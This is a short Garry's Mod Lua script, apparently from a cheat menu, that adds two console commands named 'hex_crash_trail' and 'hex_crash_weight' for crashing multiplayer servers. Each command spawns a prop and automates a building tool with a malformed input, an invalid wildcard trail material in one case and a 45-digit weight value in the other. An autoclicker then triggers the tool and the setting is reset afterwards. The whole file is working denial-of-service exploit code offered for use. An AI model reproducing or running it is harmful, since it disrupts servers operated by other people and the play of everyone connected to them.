

local RCC = RunConsoleCommand
local function TrailCrash()
	RCC("gm_spawn", "models/props_c17/furniturestove001a.mdl")
	RCC("trails_material", "Effects/*")
	RCC("gmod_tool", "trails")
	
	RCC("hex_autoclicker")
	timer.Simple(1,function()
		RCC("hex_autoclicker")
	end)
	timer.Simple(2, RCC, "trails_material", "sprites/obsolete")
end
concommand.Add("hex_crash_trail", TrailCrash)


local function WeightCrash()
	RCC("gm_spawn", "models/props_c17/furniturestove001a.mdl")
	RCC("weight_set", "999999999999999999999999999999999999999999999")
	RCC("gmod_tool", "weight")
	
	RCC("hex_autoclicker")
	timer.Simple(1,function()
		RCC("hex_autoclicker")
	end)
	timer.Simple(2, RCC, "weight_set", "100")
end
concommand.Add("hex_crash_weight", WeightCrash)



